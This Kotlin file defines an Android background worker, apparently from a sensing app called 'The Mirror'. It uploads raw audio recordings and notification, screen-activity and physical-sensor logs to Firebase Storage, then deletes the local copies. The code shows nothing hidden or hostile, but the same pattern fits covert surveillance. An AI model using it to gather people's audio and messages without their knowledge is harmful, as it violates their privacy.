package com.mirror.sensor.workers

import android.content.Context
import android.net.Uri
import android.util.Log
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.google.firebase.storage.FirebaseStorage
import kotlinx.coroutines.tasks.await

class DataUploadWorker(appContext: Context, workerParams: WorkerParameters) :
    CoroutineWorker(appContext, workerParams) {

    private val storage = FirebaseStorage.getInstance()

    override suspend fun doWork(): Result {
        Log.i(TAG, "🚀 Worker Started")
        val filesDir = applicationContext.getExternalFilesDir(null) ?: return Result.failure()

        val allFiles = filesDir.listFiles() ?: emptyArray()
        var uploadCount = 0
        var skippedCount = 0

        for (file in allFiles) {
            val isTemp = file.name.startsWith("temp_")
            val isValidType = file.name.endsWith(".m4a") || file.name.endsWith(".jsonl")

            if (isTemp || !isValidType || file.length() == 0L) continue

            // Stability Check Log
            val age = System.currentTimeMillis() - file.lastModified()
            if (age < 30_000) {
                Log.d(TAG, "⏳ Skipping unstable file: ${file.name} (Age: ${age}ms)")
                skippedCount++
                continue
            }

            try {
                val cloudFolder = when {
                    file.name.endsWith(".m4a") -> "audio_raw"
                    file.name.contains("PHYSICAL") -> "physical_logs"
                    file.name.contains("NOTIFS") -> "notification_logs"
                    file.name.contains("SCREEN") -> "screen_logs"
                    else -> "unknown_logs"
                }

                val cloudPath = "$cloudFolder/${file.name}"
                val storageRef = storage.reference.child(cloudPath)
                val fileUri = Uri.fromFile(file)

                Log.d(TAG, "⬆️ Uploading: ${file.name} -> [$cloudFolder]")
                storageRef.putFile(fileUri).await()

                if (file.delete()) {
                    Log.d(TAG, "🗑️ Local Delete: ${file.name}")
                    uploadCount++
                }

            } catch (e: Exception) {
                Log.e(TAG, "❌ Upload Failed: ${file.name}", e)
            }
        }

        Log.i(TAG, "✅ Job Done. Uploaded: $uploadCount, Skipped (Unstable): $skippedCount")
        return Result.success()
    }

    companion object {
        const val TAG = "TheMirrorUpload"
    }
}